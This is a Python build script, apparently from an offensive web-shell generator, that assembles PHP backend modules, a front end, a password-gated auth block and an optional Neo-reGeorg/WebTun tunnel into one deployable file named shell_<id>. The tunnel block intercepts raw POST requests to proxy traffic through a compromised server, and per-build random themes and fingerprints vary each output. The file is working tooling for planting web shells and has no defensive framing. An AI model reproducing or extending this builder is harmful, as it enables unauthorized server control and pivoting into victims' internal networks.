"""Build orchestration — source modules → one deployable file.

The :func:`build` function is the public entry point. It runs the
pipeline as a sequence of small, named steps so the flow reads
top-to-bottom:

    parse args → validate exclude → assemble backend → tunnel block
    → palette → auth block → frontend (css/js/html) → minify
    → first template pass → compute fingerprint → second pass
    → write file → print summary

Each step lives in a small helper below; ``build`` itself just calls
them in order.
"""

import json
import os
import random
import re
import sys

from .auth import build_auth_block
from .config import (
    MODULE_BACKEND, MODULE_JS, SCRIPT_EXTENSIONS, get_excluded_filepaths,
    load_config, load_ordered_filepaths, read_file, strip_module_blocks,
)
from .fingerprint import generate_build_meta
from .minify import minify_css, minify_js
from .paths import BACKEND_DIR, CSS_PATH, DIST_DIR, HTML_PATH, JS_DIR, TPL_DIR
from .theme import (
    THEME_PRESETS, generate_custom_css, generate_random_palette,
    hex_to_rgba, lighten_hex,
)

# Inline SVG used for the page-header logo. Lives here because it's a
# build-time constant, not a runtime asset.
SHELL_TITLE_SVG = (
    '<svg class="icon" viewBox="0 0 16 16">'
    '<path d="M1 2v12h14V2zm12 2v8H3V4zM5 6l1-1 3 3-3 3-1-1 2-2zm3 4h4v1H8z"/>'
    '</svg> SHELL'
)

# ---------------------------------------------------------------------------
# Step helpers — each owns one phase of the build pipeline
# ---------------------------------------------------------------------------

def _validate_exclude(exclude_arg, config):
    """Parse ``--exclude foo,bar`` into a set, rejecting required modules."""
    exclude = set()
    if not exclude_arg:
        return exclude
    modules = config.get('modules', {})
    for mod in exclude_arg.split(','):
        mod = mod.strip()
        if not mod:
            continue
        info = modules.get(mod)
        if info and info.get('required'):
            print(f"[!] Cannot exclude required module: {mod}")
            sys.exit(1)
        exclude.add(mod)
    return exclude


def _load_template(lang):
    """Read the language-specific template (e.g. ``templates/php.tpl``)."""
    tpl_path = os.path.join(TPL_DIR, f'{lang}.tpl')
    if not os.path.exists(tpl_path):
        print(f"[!] Template not found: {tpl_path}")
        sys.exit(1)
    return read_file(tpl_path)


def _assemble_backend(lang, excluded_files):
    """Concatenate backend source files for *lang* in declared order.

    For PHP, each source file starts with its own ``<?php`` opener so editors
    syntax-highlight them, but the template already opens PHP and slots
    {{BACKEND}} inside that block. We strip per-file ``<?php`` and ``?>``
    tags before concatenating, otherwise PHP refuses to parse nested
    open tags in the assembled shell.
    """
    ext = SCRIPT_EXTENSIONS.get(lang, f'.{lang}')
    parts = []
    for fpath in load_ordered_filepaths(BACKEND_DIR(lang), ext):
        if os.path.basename(fpath) in excluded_files:
            continue
        content = read_file(fpath)
        content = re.sub(r'^<\?php\s*', '', content)
        content = re.sub(r'\?>\s*$', '', content.strip())
        parts.append(content)
    return '\n'.join(parts)


def _build_tunnel_block(tunnel_path_arg, exclude):
    """Wrap external tunnel.php in a request guard. Returns '' if no
    --tunnel was passed."""
    if not tunnel_path_arg:
        if 'tunnel' not in exclude:
            print("[*] No --tunnel provided, tunnel tab will show setup instructions only")
        return ''

    if 'tunnel' in exclude:
        print("[!] Cannot use --tunnel with --exclude tunnel")
        sys.exit(1)

    tunnel_path = os.path.abspath(tunnel_path_arg)
    if not os.path.exists(tunnel_path):
        print(f"[!] Tunnel file not found: {tunnel_path}")
        sys.exit(1)

    code = read_file(tunnel_path).strip()
    
    # if target lang is php (safe on non-php)
    code = re.sub(r'^<\?php\s*', '', code)
    code = re.sub(r'\?>\s*$', '', code.strip())

    if '{{KEY_HASH}}' in code:
        print('[!] Tunnel file still contains {{KEY_HASH}} — run webtun.py --generate first')
        sys.exit(1)

    # POST without form 'action' is a Neo-reGeorg/WebTun tunnel command
    # (raw binary body) — must be intercepted before the shell UI renders.
    # Exclude __enc: password-mode fetchJSON sends only __enc; action lives
    # inside the ciphertext and is merged into $_POST by crypto.php later.
    block = (
        "// Neo-reGeorg / WebTun — intercept raw POST before shell UI\n"
        "if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action']) "
        "&& !isset($_POST['__auth_pass']) && !isset($_POST['__enc'])) {\n"
        "ob_end_clean();\n"
        "if (isset($__AUTH_HASH)) { session_start(); }\n"
        + code + "\n"
        "exit;\n"
        "}\n"
    )
    print(f"[*] Tunnel embedded from: {tunnel_path}")
    return block


def _resolve_palette(args):
    """Pick the palette + return (palette, theme_name).

    Precedence:
      --theme NAME       → named preset, then --accent may override
      --accent ONLY      → start from empty palette, just set accent triplet
      neither            → random hue (seedable via --seed)
    """
    palette = {}
    theme_name = 'random'

    if args.theme is not None:
        palette = dict(THEME_PRESETS[args.theme])
        theme_name = args.theme
    elif not args.accent:
        # Auto-randomize: one unique palette per build, deterministic if
        # --seed is provided (so reproducible builds get the same look).
        color_seed = args.seed if args.seed else os.urandom(16).hex()
        rng = random.Random(color_seed)
        palette = generate_random_palette(rng)

    if args.accent:
        accent = args.accent.strip().lstrip('#')
        if not re.match(r'^[0-9a-fA-F]{6}$', accent):
            print(f"[!] Invalid accent color: {args.accent} (expected #rrggbb hex)")
            sys.exit(1)
        accent = '#' + accent
        palette['--accent'] = accent
        palette['--accent-hover'] = lighten_hex(accent, 15)
        palette['--accent-10'] = hex_to_rgba(accent, 0.1)
        if not args.theme:
            theme_name = 'accent'

    if palette:
        print(f"[*] Theme: {theme_name} — accent {palette.get('--accent', 'default')}")
    return palette, theme_name


def _assemble_js(excluded_js):
    """Concatenate frontend JS in declared order (skipping excluded modules)."""
    parts = []
    for fpath in load_ordered_filepaths(JS_DIR, '.js'):
        if os.path.basename(fpath) in excluded_js:
            continue
        parts.append(read_file(fpath))
    return '\n\n'.join(parts)


def _assemble_html(exclude):
    """Load layout.html, strip excluded MODULE blocks, materialize PHP echo
    placeholders the template expects to find pre-substituted."""
    html = read_file(HTML_PATH)
    html = strip_module_blocks(html, exclude)
    html = html.replace('{{INITIAL_DIR}}', '<?= htmlspecialchars($dir) ?>')
    return html


def _apply_template(template, parts):
    """First-pass template substitution — slot all assembled pieces into
    the .tpl placeholders. Build-meta placeholders are deliberately left
    in place; they're filled in by :func:`_inject_build_meta`."""
    out = template
    for placeholder, value in parts.items():
        out = out.replace('{{' + placeholder + '}}', value)
    return out


def _inject_build_meta(content, meta):
    """Second pass — fill ``{{BUILD_*}}`` placeholders with the fingerprint
    computed from the first-pass content."""
    out = content
    out = out.replace('{{BUILD_SHORT_ID}}', meta['short_id'])
    out = out.replace('{{BUILD_HASH}}', meta['hash'])
    out = out.replace('{{BUILD_TIMESTAMP}}', meta['timestamp'])
    out = out.replace('{{BUILD_META_JSON}}', json.dumps(meta))
    return out


def _determine_output_path(args, meta, lang):
    """Resolve the dist/ output path. Operator's --output wins; otherwise
    we fall back to ``shell_<short_id>.<ext>``."""
    ext = SCRIPT_EXTENSIONS.get(lang, f'.{lang}')
    if args.output:
        name = args.output if args.output.endswith(ext) else args.output + ext
    else:
        name = f'shell_{meta["short_id"]}{ext}'
    return os.path.join(DIST_DIR, name)


def _print_summary(args, meta, out_path, theme_name, exclude, lang):
    """Operator-facing summary printed after a successful build."""
    file_size = os.path.getsize(out_path)
    excluded_str = ', '.join(sorted(exclude)) if exclude else 'none'

    print(f"[+] Generated: {out_path}")
    print(f"    Language:  {lang}")
    print(f"    Build ID:  {meta['short_id']}")
    print(f"    SHA256:    {meta['hash']}")
    print(f"    Size:      {file_size:,} bytes")
    print(f"    Excluded:  {excluded_str}")
    print(f"    Auth:      yes")
    print(f"    Encrypted: yes")
    print(f"    Tunnel:    {'embedded' if args.tunnel else 'not embedded'}")
    print(f"    Minified:  {'yes' if args.minify else 'no'}")
    print(f"    Theme:     {theme_name}")
    if args.seed:
        print(f"    Seed:      {args.seed}")


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def build(args):
    """Top-level build orchestration. Returns the output file path."""
    password = (args.password or '').strip()
    if not password:
        print('[!] --password is required (open builds are disabled)')
        sys.exit(1)

    config = load_config()
    lang = args.lang
    version = config.get('version', '1.0.0')

    # Configuration
    exclude = _validate_exclude(args.exclude, config)
    excluded_backend_filepaths, excluded_js_filepaths = get_excluded_filepaths(exclude)
    template = _load_template(lang)

    # Assemble parts
    backend = _assemble_backend(lang, excluded_backend_filepaths)
    tunnel_block = _build_tunnel_block(args.tunnel, exclude)
    palette, theme_name = _resolve_palette(args)
    custom_css = generate_custom_css(palette)
    auth_block = build_auth_block(lang, password, palette)
    print(f"[*] Auth enabled — password hash: SHA256({password[:2]}...)")

    css = read_file(CSS_PATH)
    js = _assemble_js(excluded_js_filepaths)
    html = _assemble_html(exclude)

    # Simple custom implementation, TODO enhance
    if args.minify:
        css = minify_css(css)
        js = minify_js(js)
        print("[*] Minification applied")

    # First template pass — fill everything except build-meta placeholders.
    pre_output = _apply_template(template, {
        'TUNNEL_GUARD': tunnel_block,
        'AUTH_BLOCK':   auth_block,
        'BACKEND':      backend,
        'CSS':          css,
        'CUSTOM_CSS':   custom_css,
        'JS':           js,
        'HTML_BODY':    html,
        'PAGE_TITLE':   'Shell',
        'SHELL_TITLE':  SHELL_TITLE_SVG,
    })

    # Fingerprint the assembled content, then second-pass inject the meta.
    meta = generate_build_meta(pre_output, args.seed, lang, version)
    meta['encrypted'] = True
    output = _inject_build_meta(pre_output, meta)

    # Write
    os.makedirs(DIST_DIR, exist_ok=True)
    out_path = _determine_output_path(args, meta, lang)
    with open(out_path, 'w', encoding='utf-8') as f:
        f.write(output)

    _print_summary(args, meta, out_path, theme_name, exclude, lang)
    return out_path
